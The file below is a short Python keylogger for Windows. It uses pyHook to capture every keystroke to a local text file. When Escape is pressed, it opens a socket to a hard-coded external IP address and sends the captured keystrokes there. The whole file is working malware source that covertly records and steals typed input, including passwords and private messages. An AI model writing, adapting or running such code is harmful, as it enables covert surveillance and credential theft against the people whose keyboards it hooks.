import pythoncom,pyHook
import socket

f=open('c:\output.txt','r+')
f.close()

HOST = '107.170.79.196'
PORT = 9010

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def OnKeyboardEvent(event):
    if event.Ascii == 27:
        s.connect((HOST,PORT))
        with open('c:\output.txt') as f:
           while True:
               c = f.read(1)
               if c:
                   s.send(c)
               if not c:
                   s.close()
                   break
        exit(1)
    if event.Ascii != 0 or 8:
        f = open('c:\output.txt','r+')
        keys=f.read()
        f.close()
        f=open('c:\output.txt','w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        keys+=keylogs
        f.write(keys)
        f.close()

hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()